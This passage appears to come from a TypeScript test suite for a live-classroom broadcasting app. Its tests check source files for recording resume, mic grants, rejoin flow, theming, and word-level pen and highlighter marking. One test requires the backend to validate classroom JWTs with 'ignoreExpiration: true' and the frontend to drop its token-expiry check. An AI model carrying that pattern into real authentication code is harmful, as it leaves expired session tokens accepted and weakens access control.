          !layoutSource.includes('data-testid="recording-modal-chapter-input"') &&
          !layoutSource.includes('data-testid="recording-modal-lesson-input"') &&
          layoutSource.includes('data-testid="recording-modal-voice-checkbox"') &&
          layoutSource.includes('data-testid="confirm-start-recording-btn"'),
        true,
        'LearningSessionLayout must render prefilled Start Recording Details modal for Session, Course, and Language only'
      );
    });

    it('queues chunks during network disconnect and resumes existing recording on instructor rejoin without restarting from 00:00', () => {
      const recorderSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useCompressedClassRecorder.ts'),
        'utf8'
      );
      const clientSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/services/curriculumClient.ts'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      assert.equal(
        recorderSource.includes('pendingOfflineChunksRef') &&
          recorderSource.includes('flushOfflineQueuedChunks') &&
          recorderSource.includes("window.addEventListener('online', handleOnline)"),
        true,
        'useCompressedClassRecorder must queue chunks during network drops and auto-flush on reconnect'
      );

      assert.equal(
        recorderSource.includes('hasResumableRecording') &&
          recorderSource.includes('resumeRecording') &&
          clientSource.includes("'x-resume-recording': '1'") &&
          layoutSource.includes('data-testid="resume-recording-banner"') &&
          layoutSource.includes('data-testid="resume-recording-btn"'),
        true,
        'Recorder and layout must detect already-started session recordings on rejoin and resume appending without resetting to 00:00'
      );
    });
  });

  describe('16. Instant Mic Mute/Unmute & Student Mic Grant Persistence, Content Selection Stability, Session/Course/Language Recording & Light Theme Rejoin Screen', () => {
    it('caches browser mic permission & keeps voice relay warm for <1ms toggle, and prevents student mic from auto-muting after teacher grant', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useLiveKitStage.ts'),
        'utf8'
      );
      const socketSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useBroadcastSocket.ts'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      // 1. Instant mic permission cache + warm Port-443 voice relay stream toggle
      assert.equal(
        stageSource.includes('hasVerifiedMicPermissionRef.current') &&
          stageSource.includes("name: 'microphone'") &&
          stageSource.includes('if (!canPublishAudioRef.current) {') &&
          stageSource.includes('t.enabled = false;'),
        true,
        'useLiveKitStage must cache verified mic permission and keep captureStreamRef warm while canPublishAudio is true for instant mute/unmute'
      );

      // 2. Student self-mute/unmute must not revoke teacher mic grant or refresh LiveKit token mid-speech
      assert.equal(
        socketSource.includes('!data.selfUnmuted') &&
          socketSource.includes('if (!data.selfMuted || data.revokedByTeacher === true)') &&
          layoutSource.includes('if (activated && (allowStudentUnmute || hasStudentMicGrant))'),
        true,
        'Student self-mute/unmute must preserve teacher mic grant and avoid auto-muting the student'
      );
    });

    it('preserves text selection on Content page by memoizing block HTML/segments and skipping cursor-mode state updates during selection', () => {
      const contentStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      const socketSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useBroadcastSocket.ts'),
        'utf8'
      );

      assert.equal(
        contentStageSource.includes('const memoizedBlockContentMap = useMemo(') &&
          contentStageSource.includes('const tokenizedHeaderSegments = useMemo(') &&
          contentStageSource.includes('dangerouslySetInnerHTML={memoizedBlock.htmlObj}') &&
          contentStageSource.includes("if (activeTool === 'cursor') {") &&
          socketSource.includes("if (laser?.tool !== 'cursor') {"),
        true,
        'VirtualContentStage must memoize dangerouslySetInnerHTML objects and avoid cursor-mode re-renders so text selection never auto-unselects or lags'
      );
    });

    it('renders Light Theme responsive Rejoin page with scrolling enabled, no card ID displayed, and .env Academy website URL', () => {
      const rejoinSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/RejoinScreen.tsx'),
        'utf8'
      );
      const globalsCss = fs.readFileSync(
        path.resolve(__dirname, '../src/app/globals.css'),
        'utf8'
      );
      const envLocal = fs.readFileSync(
        path.resolve(__dirname, '../.env.local'),
        'utf8'
      );

      assert.equal(
        rejoinSource.includes('process.env.NEXT_PUBLIC_ACADEMY_PORTAL_URL') &&
          rejoinSource.includes('process.env.NEXT_PUBLIC_ACADEMY_URL') &&
          rejoinSource.includes('overflow-y-auto') &&
          rejoinSource.includes('bg-white border border-slate-200') &&
          !rejoinSource.includes('ID: {selectedSessionId}') &&
          !rejoinSource.includes('Session: {selectedSessionId}'),
        true,
        'RejoinScreen must use Light Theme, allow vertical scrolling, hide session/card ID on the card, and read Academy URL from .env'
      );

      assert.equal(
        globalsCss.includes('overflow-y: auto;') &&
          envLocal.includes('NEXT_PUBLIC_ACADEMY_PORTAL_URL='),
        true,
        'globals.css must allow vertical scrolling on standalone pages and .env.local must define NEXT_PUBLIC_ACADEMY_PORTAL_URL'
      );
    });
  });

  describe('17. End Class Session Cleanup, Rejoin From Rejoin Page Only, Restart-Only When Ended, Light Theme Main Page & Responsive Content Page', () => {
    it('clears backend session state on End Class, prevents auto-reviving ENDED sessions without restart=true, and blocks auto-verify/redirect on studio.zerixtech.com root', () => {
      const audioControllerSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/modules/audio-stage/audio.controller.ts'
        ),
        'utf8'
      );
      const roomManagerSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/modules/room/room.manager.ts'
        ),
        'utf8'
      );
      const broadcastRoutesSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/routes/broadcast.routes.ts'
        ),
        'utf8'
      );
      const engineIndexSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/index.ts'
        ),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const rejoinSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/RejoinScreen.tsx'),
        'utf8'
      );

      // 1. Backend clears audio stage Redis keys and removes sessionId from active_broadcast_sessions on endSession
      assert.equal(
        audioControllerSource.includes('static async clearSessionState(sessionId: string): Promise<void>') &&
          roomManagerSource.includes("await redis.srem('active_broadcast_sessions', sessionId);") &&
          broadcastRoutesSource.includes('await AudioStageController.clearSessionState(sessionId);') &&
          engineIndexSource.includes('await AudioStageController.clearSessionState(sessionId);'),
        true,
        'Ending a session must clear AudioStageController Redis state and remove sessionId from active_broadcast_sessions'
      );

      // 2. Backend only revives an ENDED session when teacher explicitly passes restart === true
      assert.equal(
        broadcastRoutesSource.includes("(room.status !== 'ENDED' || body.restart === true)") &&
          engineIndexSource.includes("existingRoomCheck.status === 'ENDED'") &&
          engineIndexSource.includes("!(user.role === 'teacher' && payload?.restart === true)"),
        true,
        'Backend init and JOIN_ROOM must not revive an ENDED session unless teacher explicitly passes restart=true'
      );

      // 3. Direct visits to studio.zerixtech.com (/) clear sessionStorage rejoin tokens and never auto-redirect/auto-verify
      assert.equal(
        layoutSource.includes('if (!rawSessId && !rawUrlToken) {') &&
          layoutSource.includes("window.sessionStorage.removeItem('broadcast_rejoin_token');") &&
          layoutSource.includes("window.sessionStorage.removeItem('broadcast_rejoin_session_id');") &&
          layoutSource.includes('const allowStoredTokenLookup = Boolean(') &&
          rejoinSource.includes("sessionStorage.setItem('broadcast_rejoin_authorized', selectedSessionId);") &&
          rejoinSource.includes("sessionStorage.setItem('broadcast_restart_authorized', selectedSessionId);"),
        true,
        'Direct root visits to studio.zerixtech.com must clear stored session tokens and only allow stored-token rejoin when authorized from /rejoin page'
      );

      // 4. Ended classroom shows Restart Class Broadcast for teacher and no Rejoin button
      assert.equal(
        layoutSource.includes('data-testid="restart-broadcast-btn"') &&
          layoutSource.includes('const handleRestartBroadcast = useCallback(async () => {') &&
          layoutSource.includes('CurriculumClient.endSession(sessionId, token)'),
        true,
        'LearningSessionLayout must call CurriculumClient.endSession on End Class and show Restart Class Broadcast button (no Rejoin button) when class has ended'
      );
    });

    it('uses Light Theme across the main broadcast page screens and modals', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      assert.equal(
        layoutSource.includes('data-testid="studio-auth-required-screen"') &&
          layoutSource.includes('data-testid="studio-auth-verifying-screen"') &&
          layoutSource.includes("teacherStatus === 'ENDED' ? 'session-ended-screen' : 'session-left-screen'") &&
          layoutSource.includes('data-testid="start-recording-modal"') &&
          !layoutSource.includes('bg-[#0B0F19] text-slate-100') &&
          !layoutSource.includes('bg-[#111827] border border-slate-800'),
        true,
        'LearningSessionLayout must use Light Theme across main broadcast screens and modals without dark #0B0F19/#111827 backgrounds'
      );
    });

    it('makes Content page responsive across mobile, tablet, laptop, and desktop viewports', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      const cssSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/styles/learning-content.css'),
        'utf8'
      );

      assert.equal(
        stageSource.includes('max-w-4xl lg:max-w-5xl xl:max-w-6xl') &&
          stageSource.includes('overflow-x-hidden') &&
          cssSource.includes('clamp(') &&
          cssSource.includes('@media (max-width: 639px)') &&
          cssSource.includes('grid-template-columns: 1fr !important;'),
        true,
        'VirtualContentStage and learning-content.css must apply responsive container widths, fluid typography clamp(), and mobile grid stacking'
      );
    });

    it('allows students and teachers to rejoin multiple times until the class has ended without getting Classroom Authentication Required', () => {
      const broadcastRoutesSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/routes/broadcast.routes.ts'
        ),
        'utf8'
      );
      const laravelProviderSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/adapters/laravelApi.provider.ts'
        ),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const rejoinSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/RejoinScreen.tsx'),
        'utf8'
      );

      // 1. Backend mints a 12-hour signed classroom JWT for all verified participants on /sessions/init and allows active-room rejoin
      assert.equal(
        broadcastRoutesSource.includes('exp: Math.floor(Date.now() / 1000) + 12 * 3600') &&
          broadcastRoutesSource.includes('token: issuedSessionToken') &&
          laravelProviderSource.includes('ignoreExpiration: true') &&
          laravelProviderSource.includes("room.status !== 'ENDED'"),
        true,
        'Backend must issue a 12-hour classroom session JWT for all participants and allow active-session token validation until the class ends'
      );

      // 2. LearningSessionLayout resolves sessionId from token claims, persists per-session token backup, and isolates curriculum fetch errors
      assert.equal(
        layoutSource.includes('const derivedUrlSessId =') &&
          layoutSource.includes('`broadcast_rejoin_token_${effectiveSessId}`') &&
          layoutSource.includes('[LearningSessionLayout] Curriculum fetch warning:') &&
          !layoutSource.includes('if (payload.exp && payload.exp * 1000 < Date.now()) return false;'),
        true,
        'LearningSessionLayout must derive sessionId from token claims when missing in URL, persist per-session token backup, and not fail auth on curriculum warnings'
      );

      // 3. RejoinScreen waits for client hydration before checking storage and clears stale ended flags when session is active
      assert.equal(
        rejoinSource.includes('const [hasMounted, setHasMounted] = useState<boolean>(false);') &&
          rejoinSource.includes("sessionStorage.removeItem('broadcast_session_ended');") &&
          rejoinSource.includes('`broadcast_rejoin_token_${selectedSessionId}`'),
        true,
        'RejoinScreen must wait for client mount before rendering auth-required error and clear stale ended flags when rejoining an active class'
      );
    });
  });

  describe('18. Finalized Word-by-Word Content Marking, Exact Cursor/Laser Tracking, SVG Overlay Height Fix & Smooth Mobile Scroll Sync', () => {
    it('tokenizes and hit-tests words across Header, Sub-Header, Headings (h1-h6), Lists, Tables, Accordions, and Main Content without cross-block token collisions', () => {
      // 1. Subheader tokenization with 'subheader' prefix
      const subheaderTokens = ContentSyncMath.tokenizeText('Electromagnetic Induction & Faraday Law', 'subheader');
      const wordTokens = subheaderTokens.filter((t) => t.isWord);
      assert.equal(wordTokens.length, 5);
      assert.equal(wordTokens[0].tokenId, 'subheader:0');
      assert.equal(wordTokens[4].tokenId, 'subheader:4');

      // 2. HTML tokenization across h1, h2, h3, h4, summary, li, td, and p while preserving atomic <svg> and <math>
      const richHtml = `
        <h1>Main Heading Title</h1>
        <h2>Section Subheading</h2>
        <details><summary>Accordion Question Header</summary><p>Detailed answer paragraph.</p></details>
        <svg viewBox="0 0 100 20"><text>DoNotTokenizeSvg</text></svg>
      `;
      const tokenizedHtml = ContentSyncMath.tokenizeHtmlContent(richHtml, 'content');
      assert.equal(tokenizedHtml.includes('data-token-id="content:0" class="inline">Main</span>'), true);
      assert.equal(tokenizedHtml.includes('data-token-id="content:3" class="inline">Section</span>'), true);
      assert.equal(tokenizedHtml.includes('data-token-id="content:5" class="inline">Accordion</span>'), true);
      assert.equal(tokenizedHtml.includes('<text>DoNotTokenizeSvg</text>'), true);

      // 3. Proportional underline allowance in hitTestWordToken for large headings (e.g. 36px tall h1)
      const token0 = { tokenId: 'content:0', left: 20, top: 12, width: 110, height: 36 };
      const token1 = { tokenId: 'content:1', left: 140, top: 12, width: 150, height: 36 };
      const token2 = { tokenId: 'content:2', left: 300, top: 12, width: 120, height: 36 };
      const token3 = { tokenId: 'content:3', left: 430, top: 12, width: 140, height: 36 };
      const headingLayout: ContentSyncMath.BlockDomLayoutCache = {
        blockId: 'blk_1',
        blockRect: { width: 860, height: 300 } as DOMRect,
        regions: new Map([['content', { regionId: 'content', left: 0, top: 0, width: 860, height: 300 }]]),
        tokens: new Map([
          ['content:0', token0],
          ['content:1', token1],
          ['content:2', token2],
          ['content:3', token3],
        ]),
        tokenList: [token0, token1, token2, token3],
      };
      // 9px below the 36px heading bottom (y = 12 + 36 + 9 = 57) must still hit-test the heading word
      const headingUnderlineHit = ContentSyncMath.hitTestWordToken(75, 57, headingLayout);
      assert.ok(headingUnderlineHit, 'Underline drawn 9px below a 36px heading must hit-test the heading token');
      assert.equal(headingUnderlineHit?.token.tokenId, 'content:0');

      // 4. Scoped token IDs on blk_page_canvas prevent cross-block token collisions and project accurately
      assert.equal(ContentSyncMath.stripTokenBlockScope('blk_header::content:2'), 'content:2');
      assert.equal(ContentSyncMath.extractTokenBlockScope('blk_header::content:2'), 'blk_header');
      assert.equal(ContentSyncMath.stripTokenBlockScope('content:2'), 'content:2');
      assert.equal(ContentSyncMath.extractTokenBlockScope('content:2'), null);

      const extracted = ContentSyncMath.extractAnchorTokensFromPoints(
        [
          { x: 10, y: 10, tokenId: 'blk_1::content:0', rx: 0.1, ry: 0.8 },
          { x: 55, y: 10, tokenId: 'blk_1::content:3', rx: 0.9, ry: 0.8 },
        ],
        headingLayout
      );
      assert.deepEqual(extracted, [
        'blk_1::content:0',
        'blk_1::content:1',
        'blk_1::content:2',
        'blk_1::content:3',
      ]);
    });

    it('prevents .content-main-container svg CSS rule from collapsing block annotation SVG overlays and enforces exact tool cursors', () => {
      const cssSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/styles/learning-content.css'),
        'utf8'
      );
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      // 1. learning-content.css excludes [data-annotation-overlay="true"] from height: auto and forces 100% width/height
      assert.equal(
        cssSource.includes('.content-main-container svg:not([data-annotation-overlay="true"])') &&
          cssSource.includes('svg[data-annotation-overlay="true"]') &&
          cssSource.includes('height: 100% !important;'),
        true,
        'learning-content.css must protect block annotation SVG overlays from height: auto distortion'
      );

      // 2. VirtualContentStage marks all block SVG overlays (whole-page, header, subheader, content blocks) with data-annotation-overlay="true"
      const overlayCount = (stageSource.match(/data-annotation-overlay="true"/g) || []).length;
      assert.equal(
        overlayCount >= 4 &&
          stageSource.includes('data-testid="content-block-blk_subheader"') &&
          stageSource.includes('const resolveTargetBlockAtPoint = useCallback('),
        true,
        'VirtualContentStage must render data-annotation-overlay="true" on all SVG overlays, include blk_subheader, and resolve pointer targets to exact blocks'
      );

      // 3. Summary and mcq-option use display: block so tokenized word spans do not split into separate flex items
      assert.equal(
        cssSource.includes('[data-active-content-tool="laser"]') &&
          cssSource.includes('cursor: none !important;') &&
          cssSource.includes('.content-main-container . content-html-fragment [data-token-id]') === false &&
          stageSource.includes("span.setAttribute('data-marked', 'true');") &&
          stageSource.includes("span.setAttribute('data-laser-target', 'true');"),
        true,
        'CSS and VirtualContentStage must enforce exact tool cursors and synchronize word-level data-marked / data-laser-target attributes on HTML content tokens'
      );
    });

    it('uses 60fps smoothScrollFollowerTo interpolation for Student Mobile scroll sync and responsive reading box width across devices', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      assert.equal(
        stageSource.includes('const smoothScrollFollowerTo = useCallback(') &&
          stageSource.includes('smoothScrollFollowerTo(container, targetScrollTop);') &&
          stageSource.includes('overscroll-y-contain') &&
          !stageSource.includes('overflow-x-hidden scroll-smooth') &&
          stageSource.includes('w-full max-w-full min-w-0 md:w-[720px] lg:w-[860px] xl:w-[960px] max-w-4xl lg:max-w-5xl xl:max-w-6xl'),
        true,
        'VirtualContentStage must use 60fps smoothScrollFollowerTo without CSS scroll-smooth conflict and render 100% full width on mobile with a structured fixed box on larger viewports'
      );
    });
  });

  describe('19. Pen Line-Locking & Cross-Line Spike Guard on Mobile + Dedicated Highlighter Tool with Color Options', () => {
    it('locks active Pen/Highlighter strokes to preferredLineTop on Laptop so slight up/down hand movement never jumps to adjacent lines', () => {
      const laptopTokens = [
        // Line 1 on Laptop (top = 10, height = 22 -> bottom = 32)
        { tokenId: 'content:0', left: 20, top: 10, width: 80, height: 22 },
        { tokenId: 'content:1', left: 108, top: 10, width: 95, height: 22 },
        { tokenId: 'content:2', left: 211, top: 10, width: 88, height: 22 },
        // Line 2 on Laptop (top = 36, height = 22 -> bottom = 58)
        { tokenId: 'content:10', left: 20, top: 36, width: 65, height: 22 },
        { tokenId: 'content:11', left: 93, top: 36, width: 92, height: 22 },
        { tokenId: 'content:12', left: 193, top: 36, width: 85, height: 22 },
      ];
      const laptopCache: ContentSyncMath.BlockDomLayoutCache = {
        blockId: 'blk_1',
        blockRect: { left: 0, top: 0, width: 860, height: 120 } as DOMRect,
        tokens: new Map(laptopTokens.map((t) => [t.tokenId, t])),
        tokenList: laptopTokens,
        regions: new Map(),
      };

      // Teacher starts underlining Line 2 ('modern' -> 'classrooms' -> 'worldwide', preferredLineTop = 36).
      // While moving across 'classrooms' (x = 130), teacher's hand drifts slightly UP to y = 34 (between Line 1 bottom=32 and Line 2 top=36).
      // Previously, Step 1 hit Line 1 ('content:1') because 34 <= 10 + 22 + 12 (44)!
      // With preferredLineTop = 36 and non-overlapping Step 1 bounds, it MUST stay locked to Line 2 ('content:11')!
      const hitWhileDriftingUp = ContentSyncMath.hitTestWordToken(130, 34, laptopCache, 12, 36);
      assert.ok(hitWhileDriftingUp, 'Should resolve a token when drifting slightly up on Line 2');
      assert.equal(
        hitWhileDriftingUp?.token.tokenId,
        'content:11',
        'Slight upward hand movement while marking Line 2 must stay locked to Line 2 token instead of jumping to Line 1'
      );

      // Conversely, teacher starts underlining Line 1 (preferredLineTop = 10) and hand drifts slightly DOWN to y = 37 (1px inside Line 2 top=36).
      // With preferredLineTop = 10, it stays locked to Line 1 ('content:1')!
      const hitWhileDriftingDown = ContentSyncMath.hitTestWordToken(130, 37, laptopCache, 12, 10);
      assert.ok(hitWhileDriftingDown, 'Should resolve a token when drifting slightly down on Line 1');
      assert.equal(
        hitWhileDriftingDown?.token.tokenId,
        'content:1',
        'Slight downward hand movement while marking Line 1 must stay locked to Line 1 token instead of jumping to Line 2'
      );
    });

    it('repairs isolated cross-line token spikes and breaks subpaths across wrapped mobile lines so Mobile never shows long vertical/diagonal lines', () => {
      // On Mobile (340px width), Laptop Line 1 wraps across 2 lines, and Laptop Line 2 ('content:10'..'content:12') is on Mobile Line 4 (top = 112)
      const mobileTokens = [
        { tokenId: 'content:0', left: 12, top: 10, width: 75, height: 20 },
        { tokenId: 'content:1', left: 95, top: 10, width: 90, height: 20 },
        { tokenId: 'content:2', left: 193, top: 10, width: 82, height: 20 },
        // Wrapped part of Laptop Line 1 on Mobile Line 2 (top = 42)
        { tokenId: 'content:3', left: 12, top: 42, width: 78, height: 20 },
        // Laptop Line 2 tokens sit down at Mobile top = 112, and notice content:11 has left = 110 (>= content:1 left = 95!)
        { tokenId: 'content:10', left: 12, top: 112, width: 60, height: 20 },
        { tokenId: 'content:11', left: 110, top: 112, width: 88, height: 20 },
      ];
      const mobileCache: ContentSyncMath.BlockDomLayoutCache = {
        blockId: 'blk_1',
        blockRect: { left: 0, top: 0, width: 340, height: 180 } as DOMRect,
        tokens: new Map(mobileTokens.map((t) => [t.tokenId, t])),
        tokenList: mobileTokens,
        regions: new Map(),
      };

      // Case A: A stroke along Line 1 ('content:0' -> 'content:1' -> 'content:2') has a 1-point spike to 'content:11' (token index diff = 10 >= 4)
      const strokeWithCrossLineSpike = [
        { x: 5, y: 10, tokenId: 'content:0', rx: 0.2, ry: 0.9 },
        { x: 15, y: 10, tokenId: 'content:1', rx: 0.3, ry: 0.9 },
        { x: 18, y: 30, tokenId: 'content:11', rx: 0.4, ry: 0.1 }, // Accidental cross-line spike to Line 2 token
        { x: 25, y: 10, tokenId: 'content:1', rx: 0.8, ry: 0.9 },
        { x: 35, y: 10, tokenId: 'content:2', rx: 0.7, ry: 0.9 },
      ];

      const pathData = ContentSyncMath.buildResponsiveSvgPath(
        strokeWithCrossLineSpike,
        mobileCache,
        true
      );
      // Verify no Y coordinate in the SVG path ever drops down to Mobile Line 4 (y >= 100)
      const yMatches = Array.from(pathData.matchAll(/[ML]\s*[\d.]+\s+([\d.]+)/g)).map((m) =>
        parseFloat(m[1])
      );
      assert.equal(yMatches.length > 0, true);
      for (const yVal of yMatches) {
        assert.equal(
          yVal < 50,
          true,
          `SVG path on Mobile must stay on Line 1 (<50px) and never spike down to y=${yVal}px`
        );
      }

      // Case B: Multi-word stroke that genuinely spans across a wrapped line where curr.tokenBox.left >= prev.tokenBox.left
      const wrappedStroke = [
        { x: 5, y: 10, tokenId: 'content:0', rx: 0.1, ry: 0.9 },
        { x: 15, y: 10, tokenId: 'content:1', rx: 0.9, ry: 0.9 },
        // Next point is on another line (top = 112 vs top = 10) AND its left (110) >= prev left (95)
        { x: 20, y: 40, tokenId: 'content:11', rx: 0.1, ry: 0.9 },
        { x: 30, y: 40, tokenId: 'content:11', rx: 0.9, ry: 0.9 },
      ];
      const wrappedPath = ContentSyncMath.buildResponsiveSvgPath(wrappedStroke, mobileCache, true);
      const moveCommands = (wrappedPath.match(/M\s*[\d.]+\s+[\d.]+/g) || []).length;
      assert.equal(
        moveCommands >= 2,
        true,
        'buildResponsiveSvgPath must break subpath with M whenever consecutive tokens sit on different lines even if curr.left >= prev.left'
      );
    });

    it('renders dedicated Highlighter tool right after Pen tool with color options and highlights + underlines exact words across devices', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      const socketSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useBroadcastSocket.ts'),
        'utf8'
      );

      // 1. Highlighter button is present right after Pen button in VirtualContentStage toolbar
      const penBtnIdx = stageSource.indexOf('data-testid="content-tool-pen"');
      const highlighterBtnIdx = stageSource.indexOf('data-testid="content-tool-highlighter"');
      const laserBtnIdx = stageSource.indexOf('data-testid="content-tool-laser"');
      assert.equal(
        penBtnIdx > 0 && highlighterBtnIdx > penBtnIdx && laserBtnIdx > highlighterBtnIdx,
        true,
        'Highlighter tool button (data-testid="content-tool-highlighter") must be placed right after Pen tool and before Laser tool'
      );

      // 2. Color options are shown for both Pen and Highlighter tools
      assert.equal(
        stageSource.includes("(activeTool === 'pen' || activeTool === 'highlighter')") &&
          stageSource.includes("['#ef4444', '#12a3ff', '#10b981', '#f59e0b', '#eab308', '#0f172a']"),
        true,
        'Color options must be available for both Pen and Highlighter tools'
      );

      // 3. Highlighter tool applies word-by-word background highlight + underline on [data-token-id] spans and skips messy SVG path when word tokens exist
      assert.equal(
        stageSource.includes('style.backgroundColor = hexToRgba(info.highlightedColor, 0.24);') &&
          stageSource.includes('style.borderBottom = `2.5px solid ${info.highlightedColor}`;') &&
          stageSource.includes('span.style.backgroundColor = hexToRgba(info.highlightedColor, 0.24);') &&
          stageSource.includes('span.style.borderBottom = `2.5px solid ${info.highlightedColor}`;') &&
          stageSource.includes('if (isHighlighter && hasWordTokens) return null;'),
        true,
        'Highlighter tool must apply background highlight + solid bottom underline to exact word spans and suppress freehand SVG overlay when word tokens are anchored'
      );

      // 4. useBroadcastSocket supports 'highlighter' in LaserPointerState.tool
      assert.equal(
        socketSource.includes("tool?: 'cursor' | 'laser' | 'pen' | 'highlighter' | 'eraser';"),
        true,
        'LaserPointerState.tool must include highlighter'
      );
    });
  });
});
